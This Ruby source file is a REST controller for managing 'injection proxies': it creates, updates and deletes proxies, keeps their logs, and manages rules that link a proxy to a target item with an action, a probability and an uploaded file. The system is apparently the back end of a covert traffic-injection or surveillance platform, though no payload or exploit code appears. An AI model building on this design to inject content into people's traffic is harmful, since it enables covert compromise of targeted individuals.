#
# Controller for the Proxy objects
#

module RCS
module DB

class ProxyController < RESTController

  def index
    require_auth_level :server, :admin, :tech

    mongoid_query do
      result = ::Proxy.all
      return RESTController.reply.ok(result)
    end
  end

  def show
    require_auth_level :server, :admin, :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      return RESTController.reply.ok(proxy)
    end
  end

  def create
    require_auth_level :admin

    return RESTController.reply.conflict('LICENSE_LIMIT_REACHED') unless LicenseManager.instance.check :proxies

    result = Proxy.create(name: @params['name'], port: 4444, poll: false, configured: false, redirect: 'auto')

    Audit.log :actor => @session[:user][:name], :action => 'proxy.create', :desc => "Created the injection proxy '#{@params['name']}'"

    return RESTController.reply.ok(result)
  end

  def update
    require_auth_level :admin

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      @params.delete('_id')

      @params.each_pair do |key, value|
        if proxy[key.to_s] != value and not key['_ids']
          Audit.log :actor => @session[:user][:name], :action => 'proxy.update', :desc => "Updated '#{key}' to '#{value}' for injection proxy '#{proxy['name']}'"
        end
      end

      proxy.update_attributes(@params)

      return RESTController.reply.ok(proxy)
    end
  end

  def destroy
    require_auth_level :admin

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      proxy_name = proxy.name
      proxy.destroy
      Audit.log :actor => @session[:user][:name], :action => 'proxy.destroy', :desc => "Deleted the injection proxy '#{proxy_name}'"
      
      return RESTController.reply.ok
    end
  end

  def version
    require_auth_level :server

    mongoid_query do
      proxy = Proxy.find(@params['_id'])
      @params.delete('_id')

      proxy.version = @params['version']
      proxy.save

      return RESTController.reply.ok
    end
  end

  def config
    require_auth_level :server, :admin
    
    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])

      #TODO: implement config retrieval
      proxy.rules.each do |rule|
        puts rule.inspect
      end

      proxy.configured = true
      proxy.save

      return RESTController.reply.not_found
    end
  end

  def logs
    mongoid_query do
      proxy = Proxy.find(@params['_id'])

      case @request[:method]
        when 'GET'
          require_auth_level :admin, :tech
          
          klass = CappedLog.collection_class proxy[:_id]
          logs = klass.all
          return RESTController.reply.ok(logs)

        when 'POST'
          require_auth_level :server

          entry = CappedLog.dynamic_new proxy[:_id]
          entry.time = Time.parse(@params['time']).getutc.to_i
          entry.type = @params['type'].downcase
          entry.desc = @params['desc']
          entry.save
          return RESTController.reply.ok
      end

      return RESTController.reply.bad_request
    end
  end

  def del_logs
    require_auth_level :admin, :tech

    mongoid_query do
      proxy = Proxy.find(@params['_id'])

      klass = CappedLog.collection_class proxy[:_id]
      klass.destroy_all

      return RESTController.reply.ok
    end
  end

  # rule creation and modification
  def add_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      target = ::Item.find(@params['rule']['target_id'])
      
      rule = ::ProxyRule.new
      rule.enabled = @params['rule']['enabled']
      rule.probability = @params['rule']['probability']
      rule.disable_sync = @params['rule']['disable_sync']
      rule.ident = @params['rule']['ident']
      rule.ident_param = @params['rule']['ident_param']
      rule.resource = @params['rule']['resource']
      rule.action = @params['rule']['action']
      rule.action_param = @params['rule']['action_param']

      rule.target_id = [ target[:_id] ]

      # the file is uploaded to the grid before calling this method
      rule[:_grid] = [ BSON::ObjectId.from_string(@params['_grid']) ] unless @params['_grid'].nil?
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.add_rule', :target => target.name,
                :desc => "Added a rule to the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      proxy.rules << rule
      proxy.save

      return RESTController.reply.ok(rule)
    end
  end

  def del_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      return RESTController.reply.not_found if proxy.nil?

      rule = proxy.rules.find(@params['rule']['_id'])
      return RESTController.reply.not_found if rule.nil?

      target = ::Item.find(rule.target_id.first)
      return RESTController.reply.not_found if target.nil?

      Audit.log :actor => @session[:user][:name], :action => 'proxy.del_rule', :target => target.name,
                :desc => "Deleted a rule from the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"
      
      proxy.rules.delete_all(conditions: { _id: rule[:_id]})
      proxy.save

      return RESTController.reply.ok
    end
  end

  def update_rule
    require_auth_level :tech

    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      target = ::Item.find(@params['rule']['target_id'])
      rule = proxy.rules.find(@params['rule']['_id'])

      @params.delete('_id')
      @params['rule']['target_id'] = [ target[:_id] ]
      rule.update_attributes(@params['rule'])
      
      # the file is uploaded to the grid before calling this method
      rule[:_grid] = [ BSON::ObjectId.from_string(@params['rule']['_grid']) ] unless @params['rule']['_grid'].nil?
      
      rule.save
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.update_rule', :target => target.name,
                :desc => "Modified a rule on the injection proxy '#{proxy.name}'\n#{rule.ident} #{rule.ident_param} #{rule.resource} #{rule.action} #{rule.action_param}"

      return RESTController.reply.ok(rule)
    end
  end

  def apply_rules
    require_auth_level :tech
    
    mongoid_query do
      proxy = ::Proxy.find(@params['_id'])
      
      Audit.log :actor => @session[:user][:name], :action => 'proxy.apply_rules',
                :desc => "Applied the rules to the injection proxy '#{proxy.name}'"
      
      proxy.configured = false
      proxy.save

      return RESTController.reply.ok
    end
  end

end

end #DB::
end #RCS::
